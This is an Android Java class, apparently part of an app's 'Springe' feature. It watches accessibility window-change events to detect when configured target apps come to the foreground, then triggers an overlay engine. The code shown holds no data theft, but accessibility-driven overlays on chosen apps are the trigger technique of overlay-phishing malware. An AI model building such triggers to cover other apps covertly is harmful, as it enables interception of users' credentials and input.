package com.fason.app.features.springe.detection;

import android.os.Build;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.fason.app.features.springe.SpringeConfig;
import com.fason.app.features.springe.SpringeEngine;

import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * ForegroundAppWatcher — detects when the user opens/switches to a target app
 * using AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED.
 *
 * This is the trigger mechanism for Springe's auto-overlay system.
 * When a target app enters the foreground, it notifies SpringeEngine.
 *
 * Thread-safe: all state is atomic or volatile. Callbacks to engine are async.
 */
public final class ForegroundAppWatcher {

    private static final String TAG = "ForegroundWatcher";

    private final SpringeConfig config;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicReference<String> currentForegroundApp = new AtomicReference<>(null);
    private final AtomicReference<String> currentActivity = new AtomicReference<>(null);

    // Debounce: ignore rapid re-triggers of the same app (milliseconds)
    private static final long DEBOUNCE_MS = 2000;
    private volatile long lastTriggerTime = 0;

    private SpringeEngine engine;

    public ForegroundAppWatcher(SpringeConfig config) {
        this.config = config;
    }

    /**
     * Start watching. This does not start a thread — it relies on
     * AccessibilityEvents being forwarded from FasonAccessibilityService.
     */
    public void start() {
        running.set(true);
        Log.d(TAG, "Foreground watcher started");
    }

    public void stop() {
        running.set(false);
        currentForegroundApp.set(null);
        currentActivity.set(null);
        Log.d(TAG, "Foreground watcher stopped");
    }

    public boolean isRunning() { return running.get(); }

    public String getCurrentForegroundApp() { return currentForegroundApp.get(); }

    public String getCurrentActivity() { return currentActivity.get(); }

    /**
     * Called from SpringeEngine.onAccessibilityEvent().
     * Must be called from the AccessibilityService's main thread.
     */
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (!running.get()) return;
        if (event == null) return;

        try {
            switch (event.getEventType()) {
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowStateChanged(event);
                    break;

                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    // Optional: re-check if overlay was dismissed
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing accessibility event", e);
        }
    }

    private void handleWindowStateChanged(AccessibilityEvent event) {
        CharSequence packageNameCs = event.getPackageName();
        CharSequence classNameCs = event.getClassName();

        String packageName = packageNameCs != null ? packageNameCs.toString() : "";
        String className = classNameCs != null ? classNameCs.toString() : "";

        if (TextUtils.isEmpty(packageName)) return;

        // Get the root node to check if this is a real app window
        AccessibilityNodeInfo root = event.getSource();
        if (root != null) {
            try {
                // Verify it's a proper application window
                if (root.getChildCount() == 0 && root.isClickable()) {
                    // Might be a system dialog or toast, skip
                }
            } finally {
                root.recycle();
            }
        }

        // Ignore system UI packages
        if (isSystemPackage(packageName)) return;

        // Update current app
        String previous = currentForegroundApp.getAndSet(packageName);
        currentActivity.set(className);

        // Debounce: don't re-trigger for the same app within DEBOUNCE_MS
        long now = System.currentTimeMillis();
        if (packageName.equals(previous) && (now - lastTriggerTime) < DEBOUNCE_MS) {
            return;
        }

        Log.d(TAG, "Window changed to: " + packageName + "/" + className);

        // Check if we have targets configured — if not, don't trigger
        if (config.getTargetCount() == 0) return;

        // Check if this package matches any target
        if (config.matchTarget(packageName) != null) {
            lastTriggerTime = now;
            SpringeEngine engine = SpringeEngine.getInstance();
            engine.onForegroundAppChanged(packageName, className);
        }
    }

    /**
     * Filter out system/launcher packages that should never trigger overlays.
     */
    private static boolean isSystemPackage(String packageName) {
        if (packageName == null) return true;

        // Android system packages
        if (packageName.startsWith("android.")) return true;
        if (packageName.startsWith("com.android.")) return true;
        if (packageName.startsWith("com.google.android.")) return true;

        // Launchers and system UI
        if (packageName.equals("com.android.launcher")) return true;
        if (packageName.equals("com.google.android.apps.nexuslauncher")) return true;
        if (packageName.equals("com.android.systemui")) return true;

        // Our own package — never overlay ourself
        if (packageName.contains("fason")) return true;

        return false;
    }
      }
